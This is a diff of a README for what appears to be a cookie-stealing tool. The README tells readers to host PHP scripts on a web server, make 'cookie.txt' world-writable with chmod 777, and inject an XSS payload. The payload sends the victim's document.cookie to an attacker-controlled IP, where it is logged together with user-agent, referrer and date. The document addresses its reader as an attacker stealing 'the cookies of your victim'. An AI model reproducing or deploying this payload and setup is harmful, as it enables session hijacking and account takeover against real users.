@@ -11,22 +11,26 @@ sudo systemctl start apache 2
 
 #### step2 
 clone the repository in ``` /var/www/html/ ``` directory
+and go to the repository directory then give 'cookie.txt' read/write premission.
+```
+chmod 777 cookie.txt
+```
 
 #### step3
-now if any cookie or data sent to your webserver by your link, it'll save in cookie file.
-example of link:
+now if any cookie or data sent to your webserver by your link, it'll save in the cookie file.
+example of a link:
 ```
 http://192.168.1.135/p1.php?txt=your-data
 ```
 
 #### Payload
-here is some payload for vulnerabilities like XSS to steal cookies of your victim:
+here is some payload for vulnerabilities like XSS to steal the cookies of your victim:
 ```
 <script>window.location="http://192.168.1.135/wdata-grabber/p1.php?txt="+document.cookie</script>
 ```
 
 ### p1.php
-p1.php is basic version of cookie stealer that recieve and store just value of txt parameter.
+p1.php is a basic version of cookie stealer that receives and stores just the value of the txt parameter.
 
 ### p2.php
-p2.php store more data from victim. you can store ``` date user-agent referrer ``` too.
+p2.php stores more data from the victim. you can store ``` date user-agent referrer ``` too.
